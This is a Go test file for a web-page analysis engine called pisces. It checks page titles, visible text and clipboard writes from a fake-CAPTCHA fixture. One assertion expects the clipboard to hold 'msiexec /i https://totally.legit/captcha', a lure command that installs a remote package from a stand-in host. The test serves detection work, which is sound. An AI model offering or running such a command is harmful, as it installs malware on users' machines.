package engine

import (
	"testing"

	"github.com/mjc-gh/pisces"
	"github.com/mjc-gh/pisces/internal/piscestest"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestPerformAnalyzeTask(t *testing.T) {
	server := piscestest.NewTestWebServer("simple")
	task := NewTask("analyze", server.URL)

	ctx, cancel := piscestest.NewTestContext()
	defer cancel()

	ar, err := performAnalyzeTask(ctx, &task, pisces.Logger())

	require.NoError(t, err)
	assert.Equal(t, "A Simple Web Page", ar.InitialTitle)
	assert.Equal(t, "A Simple Web Page", ar.Head.Title)
	assert.Equal(t, "Simple Page Hello world!", ar.VisibleText)
}

func TestPerformAnalyzeTaskWithTitleChange(t *testing.T) {
	server := piscestest.NewTestWebServer("titlechange")
	task := NewTask("analyze", server.URL)

	ctx, cancel := piscestest.NewTestContext()
	defer cancel()

	ar, err := performAnalyzeTask(ctx, &task, pisces.Logger())

	require.NoError(t, err)
	assert.Equal(t, "Initial Title", ar.InitialTitle)
	assert.Equal(t, "Set by JS", ar.Head.Title)
}

func TestPerformAnalyzeTaskWithClipboardInteractions(t *testing.T) {
	server := piscestest.NewTestWebServer("fakecaptcha")
	task := NewTask("analyze", server.URL)
	task.params = map[string]any{"wait": 100}

	ctx, cancel := piscestest.NewTestContext()
	defer cancel()

	ar, err := performAnalyzeTask(ctx, &task, pisces.Logger())

	require.NoError(t, err)
	assert.Equal(t, []string{
		"msiexec /i https://totally.legit/captcha",
	}, ar.ClipboardTexts)
}
